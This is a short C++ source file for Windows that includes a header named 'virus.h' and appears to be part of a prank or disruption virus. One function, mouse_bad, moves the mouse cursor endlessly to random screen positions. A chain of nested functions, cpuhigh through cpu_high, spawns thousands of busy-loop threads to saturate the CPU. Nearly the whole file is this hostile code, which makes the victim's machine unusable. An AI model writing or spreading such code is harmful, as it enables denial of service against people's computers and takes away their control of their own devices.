#include <iostream>
#include "virus.h"
#include <windows.h>
#include <cstdlib>
#include<time.h>
#include <thread>
#include <fstream>
#include <unistd.h>
#include <windows.h>
#include <mutex>

using namespace std;

void rere(){
    while (1)
    {
    }
}

void mouse_bad() {
    time_t now = time(0);
    srand(now);
    while (1)
    {
        mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, rand(), rand(), 0, 0 );
    }
}

void cpuhigh() {
    int a;
    thread t1(rere);
    thread t2(rere);
    thread t3(rere);
    thread t4(rere);
    thread t5(rere);
    thread t6(rere);
    thread t7(rere);
    thread t8(rere);
    thread t9(rere);
    thread t10(rere);
    thread t11(rere);
    thread t12(rere);
    thread t13(rere);
    thread t14(rere);
    thread t15(rere);
    thread t16(rere);
    thread t17(rere);
    thread t18(rere);
    thread t19(rere);
    thread t20(rere);
    thread t21(rere);
    thread t22(rere);
    thread t23(rere);
    thread t24(rere);
    thread t25(rere);
    thread t26(rere);
    thread t27(rere);
    thread t28(rere);
    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();
    t6.join();
    t7.join();
    t8.join();
    t9.join();
    t10.join();
    t11.join();
    t12.join();
    t13.join();
    t14.join();
    t15.join();
    t16.join();
    t17.join();
    t18.join();
    t19.join();
    t20.join();
    t21.join();
    t22.join();
    t23.join();
    t24.join();
    t25.join();
    t26.join();
    t27.join();
    t28.join();
}

void cpuhighplus(){
    thread t1(cpuhigh);
    thread t2(cpuhigh);
    thread t3(cpuhigh);
    thread t4(cpuhigh);
    t1.join();
    t2.join();
    t3.join();
    t4.join();
}

void cpuhighpluspro(){
    thread t1(cpuhighplus);
    thread t2(cpuhighplus);
    thread t3(cpuhighplus);
    thread t4(cpuhighplus);
    t1.join();
    t2.join();
    t3.join();
    t4.join();
}

void cpuhighpluspromax(){
    thread t1(cpuhighpluspro);
    thread t2(cpuhighpluspro);
    thread t3(cpuhighpluspro);
    thread t4(cpuhighpluspro);
    t1.join();
    t2.join();
    t3.join();
    t4.join();
}

void cpu_high(){
    thread t1(cpuhighpluspromax);
    thread t2(cpuhighpluspromax);
    thread t3(cpuhighpluspromax);
    thread t4(cpuhighpluspromax);
    t1.join();
    t2.join();
    t3.join();
    t4.join();
}
